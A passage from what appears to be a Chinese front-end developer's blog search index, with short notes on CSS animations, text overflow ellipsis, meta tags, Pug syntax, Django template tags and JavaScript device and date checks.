    <content type="text"><![CDATA[使用for循环遍历所有的链接，聚焦的时候同时失去焦点12345for(var i = 0; i &lt; document.links.length; i++) &#123; document.links[i].onfocus = function () &#123; this.blur() &#125;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现微信语音扬声器播放效果动画]]></title>
    <url>%2Fblog%2Fcss%2F%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%AF%AD%E9%9F%B3%E6%89%AC%E5%A3%B0%E5%99%A8%E6%92%AD%E6%94%BE%E6%95%88%E6%9E%9C%E5%8A%A8%E7%94%BB.html</url>
    <content type="text"><![CDATA[效果图如下： 思路：利用一张雪碧图背景图来切换实现动画效果，通过变化图片的background-position来实现背景图的切换，不要使用3张img图片，因为img只能控制图片显示隐藏，动画效果不明显。 雪碧图如下： 具体实现如下：1div.audio-anibox 12345678910111213141516171819202122.audio-anibox&#123; width: r(23); height: r(29); background: url('../assets/audio_ani.png') no-repeat; background-size: r(23) r(87); background-position: 0 r(-58); /* 默认显示第三张 */&#125;.audio-animation &#123; animation: voiceplay 2s infinite step-start;&#125; @keyframes voiceplay&#123; 0%, 100%&#123; background-position: 0 r(-58); &#125; 33.333%&#123; background-position: 0 0; &#125; 66.666%&#123; background-position: 0 r(-29); &#125;&#125; 通过追加class实现效果 参考：http://blog.csdn.net/wowkk/article/details/53582339]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现放射圆提示点击的效果]]></title>
    <url>%2Fblog%2Fcss%2F%E5%AE%9E%E7%8E%B0%E6%94%BE%E5%B0%84%E5%9C%86%E6%8F%90%E7%A4%BA%E7%82%B9%E5%87%BB%E7%9A%84%E6%95%88%E6%9E%9C.html</url>
    <content type="text"><![CDATA[效果图如下： html:123&lt;div class="shadow shadow1 cicle-ani1"&gt;&lt;/div&gt;&lt;div class="shadow shadow2 cicle-ani2"&gt;&lt;/div&gt;&lt;div class="shadow shadow3 cicle-ani3"&gt;&lt;/div&gt; css:12345678910111213141516171819.cicle-ani1&#123; animation: circleAni 3s linear 0s infinite;&#125;.cicle-ani2&#123; animation: circleAni 3s linear 1s infinite;&#125;.cicle-ani3&#123; animation: circleAni 3s linear 2s infinite;&#125;@keyframes circleAni&#123; 0%&#123; transform: scale(1); opacity: 1; &#125; 100%&#123; transform: scale(1.6); opacity: 0; &#125;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文本溢出显示...]]></title>
    <url>%2Fblog%2Fcss%2F%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E6%98%BE%E7%A4%BA....html</url>
    <content type="text"><![CDATA[单行文本溢出123overflow: hidden;text-overflow: ellipsis;white-space: nowrap; 多行文本溢出方法1（存在兼容性，兼容移动端）12345678overflow : hidden;text-overflow: ellipsis;display: -webkit-box;-webkit-line-clamp: 2;-webkit-box-orient: vertical;padding-left: r(12);word-wrap: break-word; //防止长单词溢出word-break: break-all; //防止长单词折行 方法2（伪类实现，只适合已确定超出指定行数的）12345678910111213141516p&#123; position:relative; height: 3em; // 定高，超过两行隐藏 overflow: hidden; word-wrap: break-word; word-break: break-all;&#125;p::after&#123; content:"..."; font-weight:bold; position:absolute; bottom:0; right:0; padding: 0 2px; background: -webkit-linear-gradient(left, transparent, #fff 55%);&#125; 方法3(jQuery.dotdotdot) 参考：Github、官网12345$(document).ready(function() &#123; $("#wrapper").dotdotdot(&#123; // configuration goes here &#125;);&#125;); 方法4(Clamp.js) 参考：https://github.com/josephschmitt/Clamp.js123var module = document.getElementById("clamp-this-module");$clamp(module, &#123;clamp: 3&#125;); 方法5（ftellipsis.js） 参考：https://github.com/ftlabs/ftellipsis12345var element = document.getElementById('my-element');var ellipsis = new Ellipsis(element);ellipsis.calc();ellipsis.set();]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[等宽数字字体]]></title>
    <url>%2Fblog%2Fcss%2F%E7%AD%89%E5%AE%BD%E6%95%B0%E5%AD%97%E5%AD%97%E4%BD%93.html</url>
    <content type="text"><![CDATA[对于变化的数字来说，每个数字的宽度会直接影响视觉上是否有颤动的效果。 如在进行倒计时时，12:59:59 和 12:11:11 ，由于数字1的默认宽度会比数字5和9等要小，所以倒计时的时候数字的位置可能会时刻变化，对于有明显参照的背景来说，这种抖动的效果是不好的，所以设置等宽数字是有必要的。 设置下面这个字体即可解决1font-family: TrebuchetMS,Rotobo,&quot;Microsoft YaHei&quot;,sans-serif;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PC端导航条上二级菜单的提示箭头]]></title>
    <url>%2Fblog%2Fhtml%2FPC%E5%AF%BC%E8%88%AA%E5%9B%BE%E9%BC%A0%E6%A0%87%E5%88%92%E8%BF%87%E7%AE%AD%E5%A4%B4%E7%9A%84%E6%98%BE%E7%A4%BA%E5%8F%8A%E5%8F%98%E5%8C%96.html</url>
    <content type="text"><![CDATA[字体下载 1234@font-face&#123; src: url('../font/arrow.ttf'); font-family: 'arrow';&#125; 1234567891011121314151617181920*:after &#123; box-sizing: border-box;&#125;.user-mail:after&#123; content: "\e602"; position: absolute; top: 50%; right: 0; transform: translate(0, -50%); font-family: 'arrow'; /*自定义字体来显示小图标*/ font-style: normal; font-weight: normal; font-variant: normal; text-transform: none; line-height: 1; vertical-align: middle;&#125;.user-mail:hover:after&#123; content: "\e603";&#125;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[django静态文件设置方法]]></title>
    <url>%2Fblog%2Fhtml%2Fdjango%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[全局替换静态资源方法：123// 使用正则替换："\./([^\s]+)" -------- "&#123;% static 'newyear/$1' %&#125;"// 上面的newyear为当前项目的名称 用法: 所有页面顶部引用： 1&#123;% load staticfiles %&#125; 公用的css文件或js外部引入： 1&#123;% include '**/header.html' %&#125; a链接href地址：跳转的页面名如果是驼峰式命名，需改成下划线连接，如indexPage改成index_page；且需指明以何种方式跳转，此处为website:，因为PC端和m端的页面是放在一个目录下的，如website:表示以PC端方式跳转，wapsite:表示以m端方式跳转： 12&#123;% url 'website:index_page' %&#125;&#123;% url 'wapsite:index_page' %&#125; img标签src地址： 1&#123;% static 'website/img/logo.png' %&#125; link标签href地址： 1&#123;% static 'website/css/index.css' %&#125; script标签src地址： 1&#123;% static 'website/js/index.js' %&#125; for循环（开始处加第一行，结尾处加第二行）： 12&#123;% for item in items %&#125;&#123;% endfor %&#125; for循环含特殊控制（最后一下特殊处理，此处表示最后一项含有123456```js&#123;% for item in items %&#125;&#123;% if forloop.last %&#125;&lt;/a&gt;&#123;% endif %&#125;&#123;% endfor %&#125;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[footer自适应底部位置]]></title>
    <url>%2Fblog%2Fhtml%2Ffooter%E8%87%AA%E9%80%82%E5%BA%94%E4%BD%8D%E7%BD%AE.html</url>
    <content type="text"><![CDATA[对于页面的footer部分，有时有这样的需求1、footer始终固定在页面的底部。2、当页面内容少于一屏时显示在页面底部，多于一屏时跟随内容前进，在内容的底部。 对于1来说，直接定位在底部就可以对于2来说，就需要考虑情况了，我们可以使用css来解决这种情况 解决办法：margin + padding + min-height 中间主体部分使用min-height：100% ，padding上下为header和footer的高度 header使用margin-bottom为负的高度，footer使用margin-top为负的高度 中间区域最小高度为一屏，小于一屏时显示一屏高度，大于一屏时为内容高度 html：123&lt;div class=&quot;header&quot;&gt;头部&lt;/div&gt;&lt;div class=&quot;content&quot;&gt;&lt;/div&gt;&lt;div class=&quot;footer&quot;&gt;底部&lt;/div&gt; css:1234567891011121314151617181920212223242526*&#123; margin: 0; padding: 0; box-sizing: border-box;&#125;html,body &#123; height: 100%;&#125;.header &#123; height: 80px; margin-bottom: -80px; background: #1381cc; color: #FFF; position: relative;&#125;.content &#123; background: #CCC; min-height: 100%; padding: 80px 0 100px;&#125;.footer &#123; height:100px; margin-top: -100px; background: #0c4367; color: #FFF;&#125;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[meta标签]]></title>
    <url>%2Fblog%2Fhtml%2Fmeta%E6%A0%87%E7%AD%BE.html</url>
    <content type="text"><![CDATA[name属性 description网站描述（content中为一段介绍语） 1&lt;meta name="description" content="今天是个好日子，嘻嘻哈哈我们真开心。"&gt; keywords关键字（content中为关键字，以英文逗号分开） 1&lt;meta name="keywords" content="**,**,**,**"&gt; viewport移动端窗口 1&lt;meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no"&gt; 参数：width=device-width:视口宽度等于设备浏览器视窗宽度initial-scale=1 :缩放比为1:1，对于retina屏，根据dpr的值设定该值user-scalable=no :禁止移动端缩放 12345var scaleValue = 1.0 / dpr;var metaEl = document.createElement(&apos;meta&apos;);metaEl.setAttribute(&apos;name&apos;, &apos;viewport&apos;);metaEl.setAttribute(&apos;content&apos;, &apos;initial-scale=&apos; + scaleValue + &apos;, maximum-scale=&apos; + scaleValue + &apos;, minimum-scale=&apos; + scaleValue + &apos;, user-scalable=no&apos;);document.getElementsByTagName(&apos;head&apos;)[0].appendChild(metaEl); 详见：http://www.ghugo.com/css-retina-hairline/ robots定义搜索引擎爬虫的索引方式 1&lt;meta name="robots" content="none"&gt; 参数：none : 搜索引擎将忽略此网页，等价于 noindex，nofollow。noindex : 搜索引擎不索引此网页。nofollow: 搜索引擎不继续通过此网页的链接索引搜索其它的网页。all : 搜索引擎将索引此网页与继续通过此网页的链接索引，等价于 index，follow。index : 搜索引擎索引此网页。follow : 搜索引擎继续通过此网页的链接索引搜索其它的网页。 搜索引擎爬虫重访时间 1&lt;meta name="revisit-after" content="7 days" &gt; 作者信息 1&lt;meta name="author" content="Lxxyx,841380530@qq.com"&gt; 网页制作软件 1&lt;meta name="generator" content="Sublime Text3"&gt; 版权信息 1&lt;meta name="copyright" content="Lxxyx"&gt; //代表该网站为Lxxyx个人版权所有。 http-equiv属性 X-UA-Compatible浏览器采取何种版本渲染当前页面 1&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/&gt; //指定IE和Chrome使用最新版本渲染当前页面 cache-control指定请求和响应遵循的缓存机制 1&lt;meta http-equiv="cache-control" content="no-cache"&gt; 参数：no-cache: 先发送请求，与服务器确认该资源是否被更改，如果未被更改，则使用缓存。no-store: 不允许缓存，每次都要去服务器上，下载完整的响应。（安全措施）public : 缓存所有响应，但并非必须。因为max-age也可以做到相同效果private : 只为单个用户缓存，因此不允许任何中继进行缓存。（比如说CDN就不允许缓存private的响 应）maxage : 表示当前请求开始，该响应在多久内能被缓存和重用，而不去服务器重新请求。例如：max-age=60表示响应可以再缓存和重用 60 秒。 expires网页到期时间 1&lt;meta http-equiv="expires" content="Sunday 26 October 2016 01:00 GMT" /&gt; Set-Cookie设置cookie 12&lt;meta http-equiv="Set-Cookie" content="name, date"&gt; //格式&lt;meta http-equiv="Set-Cookie" content="User=Lxxyx; path=/; expires=Sunday, 10-Jan-16 10:00:00 GMT"&gt; //具体范例 refresh指定时间内页面自动刷新或指向指定页面 12&lt;meta http-equiv="refresh" content="2"&gt; //2秒刷新一次&lt;meta http-equiv="refresh" content="2；URL=http://www.baidu.com"&gt; //2秒后跳转到百度页面]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pug语法]]></title>
    <url>%2Fblog%2Fhtml%2Fpug%E8%AF%AD%E6%B3%95.html</url>
    <content type="text"><![CDATA[原本是叫jade的，后来因为jade的版本问题，官方已改称pug了，后续使用均用pug pug是什么？ 模板引擎 用js实现 供node使用 pug安装nodeJs中输入一下命令12npm install pug -gpug -h pug语法标签12p 转换成 &lt;p&gt;&lt;/p&gt;input 转换成 &lt;input/&gt; 文本123456789101112131415161718192021222324252627282930//标签中添加文本p 欢迎学习pug语法 转换成： &lt;p&gt;欢迎学习pug语法 &lt;/p&gt;//标签中嵌套标签p 欢迎学习pug语法 &lt;b&gt;哈哈&lt;/b&gt; 装换成： &lt;p&gt;欢迎学习pug语法 &lt;b&gt;哈哈&lt;/b&gt;&lt;/p&gt;//标签中有大段的块内容1、在标签后面添加 .script. console.log(&quot;aaaaa&quot;); console.log(&quot;bbbbb&quot;);转换成：&lt;script&gt; console.log(&quot;aaaaa&quot;); console.log(&quot;bbbbb&quot;);&lt;/script&gt;2、在每段后面添加 |script | console.log(&quot;aaaaa&quot;); | console.log(&quot;bbbbb&quot;);转换成：&lt;script&gt; console.log(&quot;aaaaa&quot;); console.log(&quot;bbbbb&quot;);&lt;/script&gt; 属性1234//以()来分割属性a(rel=&quot;aa&quot;, href=&quot;http://www.baidu.com&quot;) click转换成：&lt;a rel=&quot;aa&quot; href=&quot;&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt; 注释1234567891011121314151617181、单行注释// 这是一个单行注释转换成：&lt;!-- 这是一个单行注释 --&gt;2、多行注释body // p 这是一个注释段落转换成：&lt;body&gt;&lt;!--p 这是一个注释段落--&gt;3、不输出的注释// - 这段注释不会输出p 文本测试转换成：&lt;p&gt;文本测试&lt;/p&gt;&lt;/body&gt; doctype123456添加一个doctype只需要一个doctype，然后跟一个可选的值，默认是htmldoctype html转换成：&lt;!DOCTYPE html&gt;后面可选值包括： xml、transitionall、strict、frameset、1.1、basic、mobile 设置id或class123456789101112131、标签后面跟上#id，.classname，如果没有标签则使用默认标签div#contentp#infoa.btn转换成：&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;&lt;p id=&quot;info&quot;&gt;&lt;/p&gt;&lt;a class=&quot;btn&quot;&gt;&lt;/a&gt;2、1个id和多个classa#download-btn.btn.blue-btn转换成：&lt;a id=&quot;download&quot; class=&quot;btn blue-btn&quot;&gt;&lt;/a&gt;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符和字节]]></title>
    <url>%2Fblog%2Fhtml%2F%E5%AD%97%E7%AC%A6%E5%92%8C%E5%AD%97%E8%8A%82.html</url>
    <content type="text"><![CDATA[ASCII码：一个英文字母占一个字节的空间，一个中文汉字占两个字节的空间UTF-8编码：一个英文字符等于一个字节，一个中文等于三个字节Unicode编码：一个英文等于两个字节，一个中文等于两个字节 字符以下均对于ASCII编码格式 1 个空格：占 1 个字符 1 个汉字：占 2 个字符 1 个字母：占 1 个字符 全角符号：占 2 个字符 半角符号：占 1 个字符 字节以下均对于ASCII编码格式 字节：Byte (B) 位： bit (b) 、1 个二进制数据 1GB = 1024MB 1MB = 1024KB 1KB = 1024Byte 1Byte = 8bit (1B = 8b) 1 个汉字 = 1个字符 = 2个字节(2 Byte) = 16 位(16 bit)1 个英文或数字 = 1个字符 = 1 个字节(1 Byte) = 8 位(8 bit) 前端 1 个空格：占 1 个字符 多个空格：多个空格只显示一个空格，即 1 个空格占 1 个字符 &amp;nbsp;： 2 个&amp;nbsp;相当于一个空格，即 2 个&amp;nbsp; 占 1 个字符，一个文字的间隔需要 4 个 &amp;nbsp; 1 个汉字：占 2 个字符 1 个字母：占 1 个字符]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[其他不常用的a链接]]></title>
    <url>%2Fblog%2Fhtml%2F%E5%85%B6%E4%BB%96a%E9%93%BE%E6%8E%A5.html</url>
    <content type="text"><![CDATA[邮箱链接1234567891011121314151617&lt;!-- 最简式 --&gt;&lt;a href="mailto:xxx@xx.com"&gt;联系站长&lt;/a&gt;&lt;!-- cc标签帮你填抄送地址 --&gt;&lt;a href="mailto:xxx@xx.com?cc=xxxx@xx.com"&gt;联系站长&lt;/a&gt;&lt;!-- bcc标签帮你填暗送地址 --&gt;&lt;a href="mailto:xxx@xx.com?bcc=xxxx@xx.com"&gt;联系站长&lt;/a&gt;&lt;!-- subject标签帮你填主题 --&gt;&lt;a href="mailto:xxx@xx.com?subject=给你主页提个建议"&gt;有话直说&lt;/a&gt;&lt;!-- body标签帮你填邮件内容 --&gt;&lt;a href="mailto:xxx@xx.com?body=你的网页做得不错啊,不过就是人气不够哦"&gt;评价&lt;/a&gt;多址发送&lt;a href="mailto:xxx@xx.com,xxxx@xx.com"&gt;联系站长&lt;/a&gt; QQ对话框1&lt;a href="tencent://message/?uin=602455990&amp;Site=QQ交谈&amp;Menu=yes"&gt;点击打开QQ聊天对话框&lt;/a&gt; 电话链接1&lt;a href="tel:13811112222"&gt;13811112222&lt;/a&gt; 短信链接12345678&lt;!-- 给一个号码发短信 --&gt;&lt;a href="sms:10086"&gt;给 10086 发短信&lt;/a&gt;&lt;!-- body标签给一个号码发送已编辑好的短信 --&gt;&lt;a href="sms:10086?body=cxye"&gt;给 10086 发送内容为"cxye"的短信&lt;/a&gt;&lt;!-- body标签给多个号码发送已编辑好的短信 --&gt;&lt;a href="sms:10086,10010?body=cxye"&gt;给 10086 和 10010 发送内容为"cxye"的短信&lt;/a&gt; 注意：发短信的时候有可能会出现乱码，这个与页面的编码格式有关系，需要将页面的编码格式改为 Unicode(UTF-8)。 安卓市场12&lt;!-- 激活安卓市场的搜索功能 --&gt;&lt;a href="market://search?q=MyApp"&gt;MyApp&lt;/a&gt;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[window.location地址栏详解]]></title>
    <url>%2Fblog%2Fhtml%2Fwindow.location%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[示例链接：http://mp.weixin.qq.com/wiki/7/aaa137b55fb2e0456bf8dd9148dd613f.html?id=2&amp;name=ddd 12345678window.location.hef: 全部地址window.location.search: 后面参数 （?id=2&amp;name=ddd）window.location.host: 主机名 （mp.weixin.qq.com）window.location.hostname: 主机名 （mp.weixin.qq.com）window.location.origin: 域名 （http://mp.weixin.qq.com）window.location.pathname: 路径 （/wiki/7/aaa137b55fb2e0456bf8dd9148dd613f.html）window.location.protocol: 协议 （http:）window.location.port: 端口 （此例没有）]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[当锚点遇上顶部header占位的解决办法]]></title>
    <url>%2Fblog%2Fhtml%2F%E5%BD%93%E9%94%9A%E7%82%B9%E9%81%87%E4%B8%8A%E9%A1%B6%E9%83%A8header%E5%8D%A0%E4%BD%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content type="text"><![CDATA[http://www.ydcss.com/archives/209 背景：在开发PC网站时，有时我们会遇到需要增加锚链接的情况，但是PC网站一般都设有header区域，正常的锚链接跳转会定位到顶部，便会挡住一部分，所以需要考虑解决它，让用户的体验更好 原理：给“锚点内容”加上12padding-top:80px; // 80为header的高度margin-top:-80px; 即解决我们的问题]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[表达式和语句的简单区分]]></title>
    <url>%2Fblog%2Fhtml%2F%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8C%E8%AF%AD%E5%8F%A5.html</url>
    <content type="text"><![CDATA[表达式：有返回值1234A ? B : C //返回B或CA //返回true或falsea === b //返回true或falsea = function () &#123; &#125; //返回函数返回值 语句：没有返回值123A &amp;&amp; Ba = ba - b]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端点击300ms延迟的解决方法]]></title>
    <url>%2Fblog%2Fhtml%2F%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF300ms%E5%BB%B6%E8%BF%9F%E7%9A%84%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[meta标签法：禁用缩放12&lt;meta name="viewport" content="user-scalable=no"/&gt;&lt;meta name="viewport" content="initial-scale=1,maximum-scale=1"/&gt; user-scalable=no表明这个页面是不可缩放的，那双击缩放的功能就没有意义了，此时浏览器可以禁用默认的双击缩放行为并且去掉300ms的点击延迟。 meta标签法：更改默认的视口宽度1&lt;meta name="viewport" content="width=device-width"/&gt; width=device-width表明是一个响应式的网站，够识别出一个网站是响应式的网站，那么移动端浏览器就可以自动禁掉默认的双击缩放行为并且去掉300ms的点击延迟。 css方法1touch-action: none; IE10+支持，chrome等赞不支持 FastClick插件方法1234567891011121314151617181920212223&lt;script src="https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"&gt;&lt;/script&gt;&lt;script&gt;/*js用法：*/if ('addEventListener' in document) &#123; document.addEventListener('DOMContentLoaded', function() &#123; FastClick.attach(document.body); &#125;, false);&#125;/*jquery用法：*/$(function() &#123; FastClick.attach(document.body);&#125;);/*zepto用法：*/if ('addEventListener' in document) &#123; window.Zepto(document).on('DOMContentLoaded', function () &#123; window.FastClick.attach(document.body) &#125;)&#125;&lt;/script&gt; 快速模拟一个click，并禁止掉原有的click 总结1、2、3方法均不好用，建议使用FastClick插件]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站IE低版本不兼容提示]]></title>
    <url>%2Fblog%2Fhtml%2F%E7%BD%91%E7%AB%99IE%E4%BD%8E%E7%89%88%E6%9C%AC%E6%8F%90%E7%A4%BA.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738&lt;!--[if lt IE 9]&gt; &lt;div class="ie-disclaimer"&gt; &lt;h2 class="text-20 text-dark text-center ie-disclaimer-title"&gt;不支持的浏览器&lt;/h2&gt; &lt;p class="text-center ie-disclaimer-para"&gt;*** 提醒您，微软正式停止对 Internet Explorer 8、9 和 10 的支持。旧版 IE 将不会再获得安全更新，因此我们不支持这些浏览器。请您更换 IE 11、Chrome、Firefox 或其他现代浏览器访问本站。&lt;/p&gt; &lt;a href="mailto:" class="contactus-btn"&gt;联系我们&lt;/a&gt; &lt;p class="text-ceter"&gt;***客服帮助：***-****-****&lt;/p&gt; &lt;/div&gt;&lt;![endif]--&gt;```css/*IF IE 6、7、8、9*/.ie-disclaimer&#123; width: 500px; max-width: 500px; margin: 2em auto 0; padding: 5em; text-align: center;&#125;.ie-disclaimer-title&#123; font-size: 30px; font-weight: lighter; margin: 100px 0 20px;&#125;.ie-disclaimer-para&#123; line-height: 1.5em;&#125;.contactus-btn&#123; display: block; width: 120px; height: 40px; line-height: 40px; text-align: center; background: #eeeeee; margin: 20px auto;&#125;]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断css属性兼容性]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%88%A4%E6%96%ADcss%E5%B1%9E%E6%80%A7%E5%85%BC%E5%AE%B9%E6%80%A7.html</url>
    <content type="text"><![CDATA[在css3兴起的今天，仍然有一些阻碍进步的机器在被使用中，web开发人员依然要痛苦的兼容它们。 我们可以在js中判断css属性是否可以正常使用，以便来正确的向下兼容。 123456789101112131415161718192021222324252627cssSupport: function (attr, value) &#123; var element = document.createElement('div'); if (attr in element.style) &#123; element.style[attr] = value; // 此处会直接设置 return element.style[attr] === value; &#125; else &#123; return false; &#125;&#125;// 例如我们检测css3的position:sticky的兼容性// 需求，吸顶悬浮效果（向上滚动到顶部时，tab栏吸顶，向下离开顶部时tab又跟随页面移动）init: function () &#123; if (this.cssSupport('position', 'sticky')) &#123; return ; &#125; // 对于不支持position:sticky的还是走常规的监听scroll事件（mescroll插件中，iOS使用sticky属性，安卓走scroll监听） $('el_parent').on('scroll', function () &#123; if (scrollTop &gt; topValue) &#123; $el.style.position = 'fixed'; &#125; else &#123; $el.style.position = 'relative'; &#125; &#125;);&#125;]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断安卓版本号]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%88%A4%E6%96%AD%E5%AE%89%E5%8D%93%E7%89%88%E6%9C%AC%E5%8F%B7.html</url>
    <content type="text"><![CDATA[123var ua = window.navigator.userAgent.toLowerCase();ua.substr(ua.indexOf(&apos;android&apos;) + 8, 3)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断字符串是否是时间格式]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%98%AF%E5%90%A6%E6%98%AF%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F.html</url>
    <content type="text"><![CDATA[1234567891011121314151617const isDateString = (sDate) =&gt; &#123; const mp = /\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;/, matchArray = sDate.match(mp); if (matchArray === null) return false; const iaMonthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; let iaDate = new Array(3); iaDate = sDate.split('-'); const year = parseFloat(iaDate[0]), month = parseFloat(iaDate[1]), day = parseFloat(iaDate[2]); if (year &lt; 1900 || year &gt; 2100) return false; if (((year % 4 === 0) &amp;&amp; (year % 100 !== 0)) || (year % 400 === 0)) iaMonthDays[1] = 29; if (month &lt; 1 || month &gt; 12) return false; if (day &lt; 1 || day &gt; iaMonthDays[month - 1]) return false; return true;&#125;;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js判断用户设备]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%88%A4%E6%96%AD%E8%AE%BE%E5%A4%87.html</url>
    <content type="text"><![CDATA[判断PC端还是移动端123456789function mobilecheck() &#123; var check = false; (function(a,b) &#123; if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4)))check = true&#125;)(navigator.userAgent||navigator.vendor||window.opera); return check;&#125;if (mobilecheck()) &#123; // 非pc环境&#125; 判断设备是IOS设备还是其他设备123456789101112131415161718192021222324var browser=&#123; //检测设备 versions:function()&#123; var u = navigator.userAgent, app = navigator.appVersion; return &#123; trident: u.indexOf(&apos;Trident&apos;) &gt; -1, presto: u.indexOf(&apos;Presto&apos;) &gt; -1, webKit: u.indexOf(&apos;AppleWebKit&apos;) &gt; -1, gecko: u.indexOf(&apos;Gecko&apos;) &gt; -1 &amp;&amp; u.indexOf(&apos;KHTML&apos;) == -1, mobile: !!u.match(/AppleWebKit.*Mobile.*/), ios: 